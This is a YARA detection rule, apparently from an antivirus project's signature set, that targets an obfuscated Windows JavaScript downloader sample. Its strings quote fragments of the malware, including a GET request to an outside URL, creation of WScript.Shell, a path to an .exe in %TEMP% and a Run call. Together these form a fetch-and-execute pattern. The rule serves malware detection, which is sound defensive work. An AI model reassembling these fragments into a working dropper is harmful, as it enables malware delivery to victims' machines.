rule sig_20160330_50c3ee9fac9c9b638ee2196250a3d007 {
  meta:
    description = "datamaliciousorder - file 20160330_50c3ee9fac9c9b638ee2196250a3d007.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "980490e0f260bc4345f5cdc6206806717b83d678afce144bc659788ccb2b6e4a"

  strings:
    $s1  = "_CF[_JO](\"GET\", \"http://itead-europe.com/k3ias\", false);" fullword ascii
    $s2  = "var _NF = function _PP() {return WScript[_M](\"WScript\"+\".Shell\");}(), _IH = 11;" fullword ascii
    $s3  = "function _BT(_IL, _OZ){_FC = _FC * 1; return _IL - _OZ;};" fullword ascii
    $s4  = "if (_CF[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _L() {return _NF[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qWWQelNHApC52kz.ex\" + \"e\";};" fullword ascii
    $s6  = "function _C(){return _A + \"\";};" fullword ascii
    $s7  = "function _D(_I0){_NF[\"Run\"](_I0, _FC, _FC);};" fullword ascii
    $s8  = "function _T() {return ((_BS == true) && (_BS == _U0)) ? 1 : _FC;};" fullword ascii
    $s9  = "function _Q()" fullword ascii
    $s10 = "function _E(_ZZ) {var _QZ = (1, 2, 3, 4, 5, _ZZ); return _QZ;};" fullword ascii
    $s11 = "var _OP = new this[\"Date\"]();" fullword ascii
    $s12 = " while (_F){" fullword ascii
    $s13 = "function _HG(){return 22;};" fullword ascii
    $s14 = "return _BT(_VC, _O0);" fullword ascii
    $s15 = "function _KE(){return _M;};" fullword ascii
    $s16 = "var _R0 = false;" fullword ascii
    $s17 = "var _U0 = false;" fullword ascii
    $s18 = "_U0 = true; " fullword ascii
    $s19 = "_BS = true; " fullword ascii
    $s20 = "var _BS = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}